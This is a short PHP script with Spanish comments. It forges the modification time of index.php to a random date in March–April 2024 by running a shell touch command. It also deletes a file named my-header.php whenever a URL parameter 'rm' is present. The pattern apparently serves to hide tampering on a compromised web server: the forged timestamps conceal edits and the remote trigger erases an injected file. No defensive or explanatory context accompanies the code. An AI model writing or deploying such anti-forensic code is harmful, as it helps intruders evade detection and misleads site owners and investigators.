<?php
// Nombre de los archivos a modificar
$archivosAModificar = ['index.php'];

// Nombre del archivo a eliminar
$archivoAEliminar = 'my-header.php';

// Comprobar si el parámetro 'rm' está presente en la URL
if (isset($_GET['rm'])) {
    // Eliminar el archivo especificado
    if (file_exists($archivoAEliminar)) {
        unlink($archivoAEliminar);
        echo "El archivo $archivoAEliminar ha sido eliminado.\n";
    } else {
        echo "El archivo $archivoAEliminar no existe.\n";
    }
    exit();
}

// Función para generar una marca de tiempo aleatoria entre dos fechas
function obtenerMarcaDeTiempoAleatoria($fechaInicio, $fechaFin) {
    // Convertir las fechas al formato de marca de tiempo
    $marcaDeTiempoInicio = strtotime($fechaInicio);
    $marcaDeTiempoFin = strtotime($fechaFin);

    // Generar una marca de tiempo aleatoria entre marcaDeTiempoInicio y marcaDeTiempoFin
    return mt_rand($marcaDeTiempoInicio, $marcaDeTiempoFin);
}

// Fecha de inicio y fin en formato YmdHis (Marzo 2024 a Abril 2024)
$fechaInicio = '20240301000000';
$fechaFin = '20240430235959';

// Generar una marca de tiempo aleatoria
$marcaDeTiempoAleatoria = obtenerMarcaDeTiempoAleatoria($fechaInicio, $fechaFin);

// Convertir la marca de tiempo al formato touch
$fechaAleatoria = date('YmdHi.s', $marcaDeTiempoAleatoria);

// Ejecutar el comando touch para cambiar el tiempo de modificación de los archivos
foreach ($archivosAModificar as $archivo) {
    if (file_exists($archivo)) {
        exec("touch -t $fechaAleatoria $archivo");
        echo "El tiempo de modificación de $archivo ha sido cambiado a $fechaAleatoria\n";
    } else {
        echo "El archivo $archivo no existe.\n";
    }
}
?>
